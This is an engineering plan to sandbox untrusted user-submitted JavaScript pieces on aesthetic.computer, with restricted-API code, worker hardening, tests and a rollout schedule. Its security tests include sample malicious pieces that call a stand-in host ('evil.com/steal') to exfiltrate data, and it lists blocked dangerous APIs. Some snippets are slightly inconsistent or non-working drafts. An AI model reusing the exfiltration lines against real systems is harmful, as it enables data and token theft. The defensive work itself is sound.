# Plan: Restrict APIs for Untrusted JavaScript Pieces
**Date:** 2026-02-12
**Status:** 📝 Planning
**Priority:** 🔴 CRITICAL (Security)
**Related:** `/reports/api-security-analysis-2026-02-12.md`

---

## Goal

**Remove network access and restrict dangerous APIs for user-submitted/anonymous JavaScript pieces** to prevent:
- Token theft
- Data exfiltration
- Persistent malware
- Supply chain attacks
- Phishing

---

## Strategy: Two-Tier API System

### Tier 1: Restricted API (Untrusted Pieces)
- ✅ Safe rendering APIs (wipe, ink, box, circle, etc.)
- ✅ Safe input handling (event, mouse, keyboard)
- ✅ Namespaced storage (can't access other pieces' data)
- ❌ NO network access
- ❌ NO authentication
- ❌ NO file operations
- ❌ NO navigation control
- ❌ NO dynamic imports

**Used for:**
- Anonymous pieces (`/api/store-piece` without auth)
- New user pieces (< 7 days, < 10 pieces published)
- Unverified pieces

### Tier 2: Full API (Trusted Pieces)
- ✅ All APIs including network, auth, storage
- ✅ Full $ API as it exists today

**Used for:**
- Verified author pieces (with code signature)
- Established user pieces (account > 30 days, 10+ pieces)
- System/built-in pieces

---

## Implementation Plan

### Phase 1: Create Restricted $ API (Week 1)

#### 1.1 Define Restricted API Surface
**File:** `system/public/aesthetic.computer/lib/restricted-api.mjs`

```javascript
// restricted-api.mjs
export function createRestrictedApi($fullApi, pieceCode) {
  // Safe rendering APIs
  const rendering = {
    wipe: $fullApi.wipe,
    ink: $fullApi.ink,
    line: $fullApi.line,
    box: $fullApi.box,
    circle: $fullApi.circle,
    rect: $fullApi.rect,
    pixel: $fullApi.pixel,
    paste: $fullApi.paste,
    copy: $fullApi.copy,
    write: $fullApi.write,
    draw: $fullApi.draw,
    // ... other safe rendering APIs
  };

  // Safe input handling
  const input = {
    event: $fullApi.event,
    pen: $fullApi.pen,
    // Input is read-only, safe to expose
  };

  // Screen info (read-only)
  const screen = {
    width: $fullApi.screen.width,
    height: $fullApi.screen.height,
    // No dangerous screen APIs
  };

  // Namespaced storage (isolated per piece)
  const storage = createNamespacedStore($fullApi.store, pieceCode);

  // Math/utility functions (pure, safe)
  const utils = {
    num: $fullApi.num,
    randIntRange: $fullApi.randIntRange,
    choose: $fullApi.choose,
    dist: $fullApi.dist,
    radians: $fullApi.radians,
    degrees: $fullApi.degrees,
    // ... other pure utility functions
  };

  // Sound (consider restrictions)
  const sound = {
    sound: $fullApi.sound, // Local sound synthesis only
    // NO mic access
    // NO audio upload
  };

  // Construct restricted API
  const $restricted = {
    ...rendering,
    ...input,
    screen,
    store: storage,
    ...utils,
    ...sound,
  };

  // Deep freeze to prevent tampering
  return deepFreeze($restricted);
}

// Create namespaced storage that only accesses piece-specific keys
function createNamespacedStore(fullStore, pieceCode) {
  const namespace = `piece:${pieceCode}:`;

  return {
    async get(key) {
      return await fullStore.get(namespace + key);
    },
    async set(key, value) {
      return await fullStore.set(namespace + key, value);
    },
    async delete(key) {
      return await fullStore.delete(namespace + key);
    },
    async keys() {
      const allKeys = await fullStore.keys();
      return allKeys
        .filter(k => k.startsWith(namespace))
        .map(k => k.slice(namespace.length));
    },
    async clear() {
      const keys = await this.keys();
      for (const key of keys) {
        await this.delete(key);
      }
    }
  };
}

// Deep freeze object and prototypes
function deepFreeze(obj) {
  Object.freeze(obj);
  Object.getOwnPropertyNames(obj).forEach(prop => {
    if (obj[prop] !== null
      && (typeof obj[prop] === "object" || typeof obj[prop] === "function")
      && !Object.isFrozen(obj[prop])) {
      deepFreeze(obj[prop]);
    }
  });
  return obj;
}
```

#### 1.2 Modify Piece Loading in disk.mjs
**File:** `system/public/aesthetic.computer/lib/disk.mjs`

```javascript
// Around line 11600 where $ API is constructed
import { createRestrictedApi } from './restricted-api.mjs';

// Determine if piece should get restricted API
function shouldRestrictPiece(pieceCode, metadata) {
  // Anonymous pieces (no metadata.user)
  if (!metadata.user) return true;

  // New users (account < 7 days)
  if (metadata.userAge < 7) return true;

  // Users with < 10 pieces
  if (metadata.userPieceCount < 10) return true;

  // No code signature
  if (!metadata.signature) return true;

  return false;
}

// In piece loading function
async function loadPiece(pieceCode) {
  // ... existing loading code ...

  // Fetch piece metadata
  const metadata = await fetchPieceMetadata(pieceCode);

  // Choose API based on trust level
  const $api = shouldRestrictPiece(pieceCode, metadata)
    ? createRestrictedApi($fullApi, pieceCode)
    : $fullApi;

  // Execute piece with appropriate API
  if (loadedModule.boot) await loadedModule.boot($api);
  // ... etc
}
```

---

### Phase 2: Add Metadata to Pieces (Week 1-2)

#### 2.1 Update store-piece.mjs to Store Metadata
**File:** `system/netlify/functions/store-piece.mjs`

```javascript
// In the insertOne section
const doc = {
  code,
  slug,
  source: source.trim(),
  hash,
  when: now,
  lastAccessed: now,
  hits: 1,
  bucket,

  // Add security metadata
  trustLevel: user?.sub ? 'user' : 'anonymous',
  restricted: !user?.sub, // Anonymous pieces are restricted

  // User info (if authenticated)
  user: user?.sub,
  userEmail: user?.email,
};

// For authenticated users, fetch their account info
if (user?.sub) {
  const userInfo = await getUserInfo(user.sub);
  doc.userAge = daysSinceCreation(userInfo.created_at);
  doc.userPieceCount = await countUserPieces(user.sub);

  // Auto-promote to trusted after thresholds
  if (doc.userAge >= 7 && doc.userPieceCount >= 10) {
    doc.restricted = false;
    doc.trustLevel = 'trusted';
  }
}
```

#### 2.2 Create Metadata Endpoint
**File:** `system/netlify/functions/piece-metadata.mjs`

```javascript
export async function handler(event, context) {
  const code = event.queryStringParameters?.code;
  const database = await connect();
  const collection = database.db.collection('pieces');

  const piece = await collection.findOne({ code });
  if (!piece) {
    return respond(404, { error: 'Piece not found' });
  }

  // Return security metadata (not source code)
  return respond(200, {
    code: piece.code,
    trustLevel: piece.trustLevel || 'anonymous',
    restricted: piece.restricted !== false, // Default to restricted
    when: piece.when,
    user: piece.user || null,
    signature: piece.signature || null,
  });
}
```

Add redirect in netlify.toml:
```toml
[[redirects]]
from = "/api/piece-metadata"
to = "/.netlify/functions/piece-metadata"
status = 200
```

---

### Phase 3: Block Dangerous Global APIs (Week 2)

#### 3.1 Worker Environment Hardening
**File:** `system/public/aesthetic.computer/lib/piece-worker.mjs`

```javascript
// For restricted pieces, override dangerous globals in worker
if (pieceMetadata.restricted) {
  // Block fetch
  self.fetch = () => {
    throw new Error('Network access not allowed for untrusted pieces');
  };

  // Block dynamic import
  const originalImport = self.import;
  self.import = () => {
    throw new Error('Dynamic imports not allowed for untrusted pieces');
  };

  // Block WebSocket
  self.WebSocket = undefined;

  // Block IndexedDB (pieces use namespaced store instead)
  self.indexedDB = undefined;

  // Block other dangerous APIs
  delete self.XMLHttpRequest;
  delete self.eval; // Can't actually delete, but document restriction

  // Freeze global object
  Object.freeze(self);
}
```

#### 3.2 Validate in Piece Execution
```javascript
// Wrap piece functions to catch runtime violations
function wrapPieceFunction(fn, pieceCode, metadata) {
  if (!metadata.restricted) return fn;

  return async function wrapped($api) {
    try {
      return await fn($api);
    } catch (error) {
      // Log security violations
      if (error.message.includes('not allowed')) {
        console.error(`Security violation in piece ${pieceCode}:`, error);
        logSecurityViolation(pieceCode, error);
      }
      throw error;
    }
  };
}
```

---

### Phase 4: UI Indicators & Warnings (Week 2-3)

#### 4.1 Add Trust Badge to Pieces
Display trust level to users:

```javascript
// In piece header/info display
function getTrustBadge(metadata) {
  if (metadata.trustLevel === 'trusted') {
    return '✅ Trusted Author';
  } else if (metadata.trustLevel === 'user') {
    return '👤 New User (Restricted)';
  } else {
    return '⚠️ Anonymous (Restricted)';
  }
}
```

#### 4.2 Show Warning Before Running Untrusted Pieces
```javascript
async function runPiece(code) {
  const metadata = await fetchPieceMetadata(code);

  if (metadata.restricted && !userHasSeenWarning(code)) {
    await showWarning({
      title: 'Restricted Piece',
      message: `This piece is from ${metadata.trustLevel} and runs with limited API access.
                No network, no authentication, isolated storage.`,
      action: 'Run Anyway'
    });
    markWarningShown(code);
  }

  loadPiece(code);
}
```

#### 4.3 Update /api/store-piece Documentation
Add to response:
```javascript
return respond(201, {
  code,
  cached: false,
  url: `https://aesthetic.computer/${code}`,
  restricted: true, // Indicate if piece is restricted
  message: user
    ? 'Piece published with user restrictions. Publish 10+ pieces over 7 days to gain full API access.'
    : 'Anonymous piece published with restricted API (no network access).'
});
```

---

### Phase 5: Testing (Week 3)

#### 5.1 Unit Tests
**File:** `system/public/aesthetic.computer/lib/restricted-api.test.mjs`

```javascript
import { createRestrictedApi } from './restricted-api.mjs';

describe('Restricted API', () => {
  test('includes safe rendering APIs', () => {
    const $restricted = createRestrictedApi($fullApi, 'test');
    expect($restricted.wipe).toBeDefined();
    expect($restricted.ink).toBeDefined();
    expect($restricted.box).toBeDefined();
  });

  test('excludes dangerous APIs', () => {
    const $restricted = createRestrictedApi($fullApi, 'test');
    expect($restricted.net).toBeUndefined();
    expect($restricted.upload).toBeUndefined();
    expect($restricted.jump).toBeUndefined();
    expect($restricted.authorize).toBeUndefined();
  });

  test('namespaces storage per piece', async () => {
    const $r1 = createRestrictedApi($fullApi, 'piece1');
    const $r2 = createRestrictedApi($fullApi, 'piece2');

    await $r1.store.set('key', 'value1');
    await $r2.store.set('key', 'value2');

    expect(await $r1.store.get('key')).toBe('value1');
    expect(await $r2.store.get('key')).toBe('value2');
  });

  test('freezes API object', () => {
    const $restricted = createRestrictedApi($fullApi, 'test');
    expect(() => {
      $restricted.malicious = () => {};
    }).toThrow();
  });
});
```

#### 5.2 Integration Tests
Create test pieces:

**Test 1: Anonymous piece (should be restricted)**
```javascript
// test-restricted.mjs
export function boot($) {
  // These should work
  $.wipe('blue');
  $.ink('yellow');

  // These should throw
  try {
    $.net.preload('https://evil.com'); // Should fail
  } catch (e) {
    console.log('✅ Network blocked:', e.message);
  }

  try {
    await $.authorize(); // Should fail
  } catch (e) {
    console.log('✅ Auth blocked:', e.message);
  }
}
```

**Test 2: Trusted piece (should have full access)**
```javascript
// test-trusted.mjs (published by verified user)
export async function boot($) {
  // Should work for trusted pieces
  const data = await $.net.preload('/api/test');
  console.log('✅ Network allowed:', data);
}
```

#### 5.3 Security Tests
```javascript
describe('Security', () => {
  test('cannot access other pieces storage', async () => {
    // Piece1 sets data
    await runPiece('piece1', ($) => {
      $.store.set('secret', 'sensitive');
    });

    // Piece2 should not see it
    await runPiece('piece2', async ($) => {
      const val = await $.store.get('secret');
      expect(val).toBeUndefined();
    });
  });

  test('cannot make network requests', async () => {
    const malicious = `
      export async function boot($) {
        await fetch('https://evil.com/steal');
      }
    `;

    await expect(runUntrustedPiece(malicious)).rejects.toThrow('not allowed');
  });

  test('cannot access auth tokens', async () => {
    const malicious = `
      export async function boot($) {
        const token = await $.authorize();
      }
    `;

    await expect(runUntrustedPiece(malicious)).rejects.toThrow();
  });
});
```

---

### Phase 6: Migration & Rollout (Week 4)

#### 6.1 Backfill Existing Pieces
**File:** `system/backend/backfill-piece-restrictions.mjs`

```javascript
// One-time migration script
async function backfillPieceRestrictions() {
  const database = await connect();
  const pieces = database.db.collection('pieces');

  const allPieces = await pieces.find({}).toArray();

  for (const piece of allPieces) {
    const update = {
      trustLevel: piece.user ? 'user' : 'anonymous',
      restricted: !piece.user, // Default: anonymous = restricted
    };

    // Check user age/count for existing users
    if (piece.user) {
      const userInfo = await getUserInfo(piece.user);
      const userAge = daysSinceCreation(userInfo.created_at);
      const pieceCount = await pieces.countDocuments({ user: piece.user });

      if (userAge >= 7 && pieceCount >= 10) {
        update.restricted = false;
        update.trustLevel = 'trusted';
      }
    }

    await pieces.updateOne({ _id: piece._id }, { $set: update });
  }

  console.log(`✅ Backfilled ${allPieces.length} pieces`);
}
```

#### 6.2 Gradual Rollout
1. **Week 1-2**: Deploy to dev/staging
2. **Week 3**: Enable for new pieces only (existing pieces unrestricted)
3. **Week 4**: Backfill existing anonymous pieces
4. **Week 5**: Monitor for issues, adjust restrictions as needed
5. **Week 6**: Enable for all pieces

#### 6.3 Feature Flags
```javascript
const RESTRICTIONS_ENABLED = {
  dev: true,
  staging: true,
  production: process.env.ENABLE_PIECE_RESTRICTIONS === 'true'
};

function getApiForPiece(piece, metadata) {
  if (!RESTRICTIONS_ENABLED[environment]) {
    return $fullApi; // Feature flag disabled
  }

  return shouldRestrictPiece(piece.code, metadata)
    ? createRestrictedApi($fullApi, piece.code)
    : $fullApi;
}
```

---

## Allowed APIs in Restricted Mode

### ✅ ALLOWED (Safe)

**Rendering:**
- `wipe()`, `ink()`, `line()`, `box()`, `circle()`, `rect()`, `pixel()`
- `paste()`, `copy()`, `write()`, `draw()`, `grid()`, `graph()`
- `painting` object (drawing state)
- `screen.width`, `screen.height`

**Input:**
- `event` (keyboard, mouse, touch events)
- `pen` (drawing input)
- Input is read-only, no security risk

**Storage (Namespaced):**
- `store.get()`, `store.set()`, `store.delete()`, `store.keys()`, `store.clear()`
- **Restriction:** Each piece gets isolated namespace `piece:{code}:*`
- Cannot access other pieces' data
- Cannot access system data

**Utilities (Pure Functions):**
- `num()`, `randIntRange()`, `choose()`, `dist()`, `radians()`, `degrees()`
- Math utilities: `abs()`, `floor()`, `ceil()`, `round()`, `clamp()`
- Color utilities (if pure)

**Sound (Local):**
- `sound()` - Local synthesis only
- `bpm()`, `beat()` - Audio timing
- **Restriction:** No mic access, no audio upload

**Help/Docs:**
- `help()` - Display help text (safe)

---

### ❌ BLOCKED (Dangerous)

**Network:**
- `net.preload()` - HTTP requests
- `net.userRequest()` - Authenticated HTTP
- `net.web()` - External navigation
- `Socket` - WebSocket connections
- `Chat` - Chat system (requires network)

**Authentication:**
- `authorize()` - Get auth tokens
- `net.signup()`, `net.login()`, `net.logout()`
- `net.getToken()`

**File Operations:**
- `upload()` - File upload to server
- `download()` - File download
- `file()` - File picker

**Navigation:**
- `jump()` - Navigate to other pieces/URLs
- `goto()` - URL navigation

**Dynamic Code:**
- `import()` - Dynamic imports blocked at worker level
- `eval()` - Blocked (can't fully prevent, but document restriction)

**User Data:**
- `wallet` - Crypto wallet access
- `mint()`, `print()`, `mug()` - E-commerce

**Media:**
- `mic` - Microphone access
- `camera` - Camera access
- `motion` - Device motion (could be allowed, TBD)

**System:**
- `code.channel()` - Live code reloading
- Global `fetch`, `WebSocket`, `indexedDB` (blocked in worker)

---

## Success Criteria

### Security Metrics
- [ ] Zero network requests from untrusted pieces
- [ ] Zero auth token leaks
- [ ] Zero cross-piece storage access
- [ ] All security tests passing

### Functionality Metrics
- [ ] All rendering APIs work in restricted mode
- [ ] Storage is properly namespaced
- [ ] Existing trusted pieces unaffected
- [ ] < 1% support requests about restrictions

### User Experience
- [ ] Clear trust badges displayed
- [ ] Helpful error messages when API blocked
- [ ] Path to becoming trusted is clear
- [ ] Documentation updated

---

## Rollback Plan

If critical issues arise:

1. **Immediate**: Set feature flag `ENABLE_PIECE_RESTRICTIONS=false`
2. **Investigate**: Check logs for errors, user reports
3. **Adjust**: Modify restricted API if too limiting
4. **Re-enable**: Gradual rollout again with fixes

Rollback is clean because feature flag controls entire system.

---

## Future Enhancements

### Phase 7: Permission System (Future)
Allow pieces to request specific capabilities:

```javascript
// In piece metadata
export const permissions = [
  'network:read',  // HTTP GET only
  'storage:write', // Write to storage
];

// User approves on first run
if (await requestPermissions(permissions)) {
  // Grant specific APIs
}
```

### Phase 8: Code Signing (Future)
Verified authors can sign their code:

```javascript
// Piece includes signature
export const signature = {
  algorithm: 'RS256',
  publicKey: 'author-public-key',
  signature: 'base64-signature'
};

// Verified pieces get full API
if (await verifySignature(piece)) {
  piece.trustLevel = 'verified';
  piece.restricted = false;
}
```

---

## Files to Modify

### New Files:
- [ ] `system/public/aesthetic.computer/lib/restricted-api.mjs`
- [ ] `system/public/aesthetic.computer/lib/restricted-api.test.mjs`
- [ ] `system/netlify/functions/piece-metadata.mjs`
- [ ] `system/backend/backfill-piece-restrictions.mjs`

### Modified Files:
- [ ] `system/public/aesthetic.computer/lib/disk.mjs` (piece loading)
- [ ] `system/netlify/functions/store-piece.mjs` (add metadata)
- [ ] `system/netlify.toml` (add piece-metadata redirect)
- [ ] `system/public/aesthetic.computer/lib/piece-worker.mjs` (worker hardening)
- [ ] Documentation: README, API docs, piece authoring guide

---

## Timeline

| Week | Phase | Tasks |
|------|-------|-------|
| 1 | Phase 1 | Create restricted API, modify disk.mjs |
| 1-2 | Phase 2 | Add metadata to pieces, create endpoint |
| 2 | Phase 3 | Block global APIs in workers |
| 2-3 | Phase 4 | UI indicators, warnings, docs |
| 3 | Phase 5 | Testing (unit, integration, security) |
| 4 | Phase 6 | Migration, gradual rollout |

**Total:** ~4 weeks to production

---

## Questions / Decisions Needed

1. **Sound API**: Allow local synthesis? Or block entirely?
2. **Motion API**: Device motion can be sensor data - allow or block?
3. **Color camera**: Read-only camera for color picking - allow or block?
4. **Thresholds**: Are 7 days / 10 pieces the right trust thresholds?
5. **Migration**: Restrict existing anonymous pieces or grandfather them?
6. **Help system**: Should `help()` be allowed (could load docs)?

---

## Owner

**Implementation:** TBD
**Review:** Security team
**Testing:** QA team
**Approval:** Product owner

---

**Next Steps:**
1. Review and approve plan
2. Create implementation tickets
3. Assign to engineer
4. Begin Phase 1 development
